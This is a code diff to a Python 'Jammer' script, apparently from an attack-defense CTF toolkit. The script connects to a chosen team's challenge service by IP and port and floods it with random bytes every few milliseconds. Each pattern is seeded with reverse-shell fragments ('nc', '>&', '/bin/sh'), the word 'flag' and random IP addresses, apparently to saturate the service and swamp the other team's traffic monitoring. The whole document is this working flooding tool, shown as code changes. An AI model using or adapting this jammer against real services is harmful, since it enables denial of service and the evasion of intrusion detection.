@@ -12,44 +12,64 @@ from andctf import *
 import os 
 import random
 
-debug = True
+debug = False
 
-def jamming_pattern()->str:
-    pattern = os.urandom(random.randint(1, 1000))
 
-    # Packet Jamming
-    pattern[random.randrange(len(pattern)):] = 'nc'
-    pattern[random.randrange(len(pattern)):] = '>&'
-    pattern[random.randrange(len(pattern)):] = '/bin/sh'
-    pattern[random.randrange(len(pattern)):] = 'flag'
-    pattern[random.randrange(len(pattern)):] = (str(randint(0x100))+".")*3+str(randint(0x100))
+def rand()->int:
+    return random.randrange(jamming_length)
 
+def jamming_pattern()->bytearray:
+    pattern = bytearray(os.urandom(random.randint((jamming_length*4//5), jamming_length)))
+
+    if random.random() > 0.8:
+        return pattern
+
+    # Jamming with blacklist
+    for jam in jamming_blacklist:
+        idx = rand()
+        pattern[idx:idx+len(jam)] = jam
+
+    # Jamming with random IP
+    idx = rand()    
+    for i in range(3):
+        tmp = (str(random.randrange(0x100))+".").encode()
+        pattern[idx:idx+len(tmp)] = tmp
+        idx += len(tmp) 
+
+    tmp = str(random.randrange(0x100)).encode()
+    pattern[idx:idx+len(tmp)] = tmp 
+    
     return pattern
 
 def jamming(ip: str, port: int):
+    global debug
+    
     print("[*] Initializing Jammer")
     idx = 0
     try:
         p = remote(ip, port)
-    
+
     except:
-        print("[*] Jamming Failed - Open Error")
-        print(ip_to_team(ip) + " - " + port_to_chal(port))
+        print("[*] Jamming Failed - Open Error: " + ip_to_team(ip) + " - " + port_to_chal(port))
+        print()
         return
 
     while True:
+        p.sendline(jamming_pattern())
+        
         try:
-            p.send(jamming_pattern)
+            p.sendline(jamming_pattern())
         except:
-            print("[*] Jamming Failed - Send Error")
-            print(ip_to_team(ip) + " - " + port_to_chal(port))
+            print("[*] Jamming Failed - Send Error: " + ip_to_team(ip) + " - " + port_to_chal(port))
+            print()
             return
         
-        idx+=1
-        if idx % 0x200 == 0:
+        if idx % 0x200 == 0 and debug:
             print("[*] Jamming * "+str(idx)+"...")
             print(jamming_pattern())
-            sleep(3)
+            sleep(2)
+        
+        idx+=1
         sleep(0.005)
         
 
@@ -57,7 +77,7 @@ def jamming(ip: str, port: int):
 def main():
     global debug 
     print("Jammer - Saturate specific team's chal")
-    debug = input("[*] Debug: [y/n]\n") != 'n'
+    debug = input("[*] Debug: [y/n] ") != 'n'
 
 
     ip = input("[*] ip: ")[:-1]
